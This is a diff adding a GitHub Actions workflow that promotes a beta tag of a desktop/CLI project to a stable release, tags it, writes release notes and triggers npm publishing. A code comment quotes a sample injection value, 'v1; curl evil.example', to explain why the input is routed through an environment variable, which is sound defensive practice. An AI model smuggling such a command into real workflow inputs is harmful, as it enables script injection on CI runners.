@@ -1,0 +1,262 @@
+name: Promote stable
+
+# On-demand stable promotion on inkeep/open-knowledge-legacy.
+#
+# Engineer triggers via the GitHub Actions UI with a beta_tag input
+# (e.g., v0.4.0-beta.3). The workflow:
+#   1. Verifies the beta tag exists.
+#   2. Reads package.json#version at the tag, strips -beta.N to compute
+#      the stable version (0.4.0).
+#   3. Tags vX.Y.Z (no suffix) at the SAME SHA as the beta tag.
+#   4. Creates a non-prerelease GitHub Release at vX.Y.Z. desktop-release.yml
+#      fires automatically and builds the stable DMG with
+#      --config.extraMetadata.version=X.Y.Z (override since the legacy commit
+#      still has -beta.N in package.json).
+#   5. Promotes npm `latest` dist-tag using a transient package.json#version
+#      override (same primitive as D11/D13 of the spec — mutation lives only
+#      for the workflow run, not committed).
+#
+# After this completes, the engineer triggers main-reset.yml on
+# inkeep/agents-private to advance the base for the next cycle. (D19
+# leaves auto-trigger as a follow-up; v1 is two-button.)
+#
+# Concurrency group is shared with release.yml so beta cuts and stable
+# promotions never race on the same legacy state.
+
+on:
+  workflow_dispatch:
+    inputs:
+      beta_tag:
+        description: "Beta tag to promote (e.g., v0.4.0-beta.3)"
+        required: true
+        type: string
+
+permissions:
+  contents: write
+  id-token: write
+  packages: write
+
+concurrency:
+  group: ok-release-cadence
+  cancel-in-progress: false
+
+jobs:
+  promote:
+    name: Promote ${{ inputs.beta_tag }} to stable
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: Checkout
+        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
+        with:
+          fetch-depth: 0
+          # We need to operate on the beta tag's SHA for the package.json
+          # override + bun changeset publish. We resolve and check it out
+          # explicitly below; default-branch checkout above is just so the
+          # workflow scripts (this file) live next to a writable working
+          # tree.
+
+      - name: Verify beta tag exists
+        env:
+          BETA_TAG: ${{ inputs.beta_tag }}
+        run: |
+          set -euo pipefail
+          # actions/checkout fetches all refs with fetch-depth: 0; verify
+          # the supplied tag is present.
+          if ! git rev-parse "refs/tags/${BETA_TAG}" >/dev/null 2>&1; then
+            echo "::error::Beta tag '${BETA_TAG}' not found on legacy. Did the auto-cadence release run?"
+            exit 1
+          fi
+          echo "Tag ${BETA_TAG} resolves to $(git rev-parse refs/tags/${BETA_TAG})"
+
+      - name: Compute stable version from beta tag
+        id: ver
+        env:
+          BETA_TAG: ${{ inputs.beta_tag }}
+        run: |
+          set -euo pipefail
+          # The beta tag points at a commit whose desktop package.json has
+          # the matching -beta.N version.
+          BETA_VERSION=$(git show "refs/tags/${BETA_TAG}":packages/desktop/package.json | jq -r '.version')
+
+          # Validate format and strip suffix.
+          if [[ ! "$BETA_VERSION" =~ ^([0-9]+\.[0-9]+\.[0-9]+)-beta\.[0-9]+$ ]]; then
+            echo "::error::Beta tag's package.json version '$BETA_VERSION' is not in the expected X.Y.Z-beta.N format."
+            exit 1
+          fi
+
+          STABLE_VERSION="${BASH_REMATCH[1]}"
+          STABLE_TAG="v${STABLE_VERSION}"
+          BETA_SHA=$(git rev-parse "refs/tags/${BETA_TAG}")
+
+          echo "beta_version=$BETA_VERSION" >> "$GITHUB_OUTPUT"
+          echo "stable_version=$STABLE_VERSION" >> "$GITHUB_OUTPUT"
+          echo "stable_tag=$STABLE_TAG" >> "$GITHUB_OUTPUT"
+          echo "beta_sha=$BETA_SHA" >> "$GITHUB_OUTPUT"
+
+          echo "Promoting $BETA_VERSION ($BETA_SHA) to stable $STABLE_VERSION ($STABLE_TAG)"
+
+      - name: Tag stable at beta SHA
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          STABLE_TAG: ${{ steps.ver.outputs.stable_tag }}
+          BETA_SHA: ${{ steps.ver.outputs.beta_sha }}
+        run: |
+          set -euo pipefail
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+
+          # Idempotency: a re-run after a transient failure should not
+          # explode if the tag already exists.
+          if git rev-parse "refs/tags/${STABLE_TAG}" >/dev/null 2>&1; then
+            EXISTING=$(git rev-parse "refs/tags/${STABLE_TAG}")
+            if [[ "$EXISTING" != "$BETA_SHA" ]]; then
+              echo "::error::Stable tag ${STABLE_TAG} already exists at ${EXISTING} (expected ${BETA_SHA}). Refusing to retag."
+              exit 1
+            fi
+            echo "Tag ${STABLE_TAG} already at ${BETA_SHA}; skipping git tag step."
+          else
+            git tag "$STABLE_TAG" "$BETA_SHA"
+            git push origin "$STABLE_TAG"
+          fi
+
+      - name: Aggregate beta CHANGELOG entries since previous stable
+        id: changelog
+        env:
+          STABLE_TAG: ${{ steps.ver.outputs.stable_tag }}
+          BETA_SHA: ${{ steps.ver.outputs.beta_sha }}
+          STABLE_VERSION: ${{ steps.ver.outputs.stable_version }}
+          # Pass `inputs.beta_tag` via env to keep ${{ }} expression
+          # interpolation out of the run: block — direct ${{ }} substitution
+          # in shell is a script-injection foothold (a malicious tag value
+          # like `v1; curl evil.example` would expand textually before bash
+          # parsed the printf invocation). Defense-in-depth even though
+          # workflow_dispatch requires repo write access.
+          BETA_TAG_INPUT: ${{ inputs.beta_tag }}
+        run: |
+          set -euo pipefail
+          BODY_FILE=$(mktemp)
+
+          # Resolve the previous stable tag (most recent tag matching v*.*.*
+          # without -beta suffix, ancestor of the beta SHA). May be empty for
+          # the first-ever stable.
+          PREV_STABLE=$(git tag --list 'v*' --sort=-version:refname \
+            --merged "$BETA_SHA" \
+            | grep -E '^v[0-9]+\.[0-9]+\.[0-9]+$' \
+            | grep -v "^${STABLE_TAG}$" \
+            | head -n 1 || true)
+
+          if [[ -n "$PREV_STABLE" ]]; then
+            echo "Aggregating betas in range ${PREV_STABLE}..${STABLE_TAG}"
+            BETA_TAGS_IN_RANGE=$(git tag --list "v${STABLE_VERSION}-beta.*" --merged "$BETA_SHA" --sort=version:refname | grep -v "^${PREV_STABLE}$" || true)
+          else
+            echo "No previous stable tag; aggregating all betas at ${STABLE_VERSION}"
+            BETA_TAGS_IN_RANGE=$(git tag --list "v${STABLE_VERSION}-beta.*" --merged "$BETA_SHA" --sort=version:refname || true)
+          fi
+
+          # Concatenate per-beta CHANGELOG entries (D12 acceptable form).
+          {
+            printf '## %s\n\n' "$STABLE_VERSION"
+            printf 'Stable promotion of beta %s.\n\n' "$BETA_TAG_INPUT"
+            if [[ -n "$BETA_TAGS_IN_RANGE" ]]; then
+              printf 'Aggregated changes since previous stable:\n\n'
+              for tag in $BETA_TAGS_IN_RANGE; do
+                BETA_VER=${tag#v}
+                printf '### %s\n\n' "$BETA_VER"
+                # Pull this beta's CHANGELOG entry. Prefer desktop's
+                # CHANGELOG; fall back to cli's.
+                for changelog in packages/desktop/CHANGELOG.md packages/cli/CHANGELOG.md; do
+                  if git show "refs/tags/${tag}":"${changelog}" >/dev/null 2>&1; then
+                    git show "refs/tags/${tag}":"${changelog}" \
+                      | awk -v ver="${BETA_VER}" '
+                          $0 ~ "^## " ver "([^[:digit:].]|$)" { capture=1; next }
+                          capture && /^## / { exit }
+                          capture { print }
+                        '
+                    break
+                  fi
+                done
+                printf '\n'
+              done
+            fi
+          } > "$BODY_FILE"
+
+          echo "body_file=$BODY_FILE" >> "$GITHUB_OUTPUT"
+          echo "---- Release body preview ----"
+          cat "$BODY_FILE"
+          echo "------------------------------"
+
+      - name: Create stable GitHub Release
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          STABLE_TAG: ${{ steps.ver.outputs.stable_tag }}
+          BETA_SHA: ${{ steps.ver.outputs.beta_sha }}
+          BODY_FILE: ${{ steps.changelog.outputs.body_file }}
+        run: |
+          set -euo pipefail
+          # Idempotency: a re-run after a transient failure should not
+          # explode if the Release already exists.
+          if gh release view "$STABLE_TAG" >/dev/null 2>&1; then
+            echo "Release ${STABLE_TAG} already exists; updating notes + ensuring --latest."
+            gh release edit "$STABLE_TAG" --notes-file "$BODY_FILE" --prerelease=false --latest
+          else
+            gh release create "$STABLE_TAG" \
+              --target "$BETA_SHA" \
+              --title "$STABLE_TAG" \
+              --notes-file "$BODY_FILE" \
+              --latest
+          fi
+
+      - name: Trigger release.yml to publish stable to npm
+        # Same-repo repository_dispatch into release.yml. release.yml
+        # listens for event_type=publish-stable, checks out the stable
+        # tag, applies the transient package.json#version override, and
+        # runs `bun changeset publish --tag latest --provenance` via
+        # npm Trusted Publishing OIDC.
+        #
+        # Why we delegate to release.yml instead of publishing here:
+        # npm Trusted Publishing only allows ONE trusted-publisher entry
+        # per package. Centralizing the publish call in release.yml
+        # means the npmjs.com TP entry only authorizes one workflow
+        # filename. promote-stable.yml owns tag + Release creation; npm
+        # publishing lives in release.yml.
+        #
+        # Same-repo dispatch — no PAT required. The default GITHUB_TOKEN
+        # with contents: write can fire repository_dispatch on its own
+        # repo. The dispatched run has its own OIDC identity:
+        # workflow=release.yml, which matches the TP entry.
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          STABLE_TAG: ${{ steps.ver.outputs.stable_tag }}
+          STABLE_VERSION: ${{ steps.ver.outputs.stable_version }}
+        run: |
+          set -euo pipefail
+          payload=$(jq -nc \
+            --arg ref "$STABLE_TAG" \
+            --arg version "$STABLE_VERSION" \
+            '{event_type: "publish-stable", client_payload: {ref: $ref, version: $version}}')
+          gh api -X POST "repos/${GITHUB_REPOSITORY}/dispatches" --input - <<<"$payload"
+          echo "Dispatched publish-stable to release.yml (ref=${STABLE_TAG}, version=${STABLE_VERSION})."
+          echo "release.yml will run the npm publish + provenance attestation in its own job."
+
+      - name: Optional cross-repo dispatch to trigger main-reset on agents-private
+        # D19: gated on LEGACY_TO_PRIVATE_DISPATCH_TOKEN being set. If the
+        # secret is absent, the step skips silently (v1 is two-button).
+        # When the secret is set, fire a repository_dispatch event on
+        # agents-private so main-reset.yml runs without a second manual
+        # click. Secrets cannot be referenced in `if:` expressions, so the
+        # gate lives inside the step.
+        env:
+          LEGACY_TO_PRIVATE_DISPATCH_TOKEN: ${{ secrets.LEGACY_TO_PRIVATE_DISPATCH_TOKEN }}
+          STABLE_VERSION: ${{ steps.ver.outputs.stable_version }}
+        run: |
+          set -euo pipefail
+          if [[ -z "${LEGACY_TO_PRIVATE_DISPATCH_TOKEN:-}" ]]; then
+            echo "LEGACY_TO_PRIVATE_DISPATCH_TOKEN not configured — skipping auto-trigger of main-reset (D19 v1 is two-button)."
+            exit 0
+          fi
+          curl -fsSL -X POST \
+            -H "Authorization: token ${LEGACY_TO_PRIVATE_DISPATCH_TOKEN}" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/inkeep/agents-private/dispatches" \
+            -d "$(jq -nc --arg v "$STABLE_VERSION" '{event_type:"main-reset", client_payload:{stable_version:$v}}')"
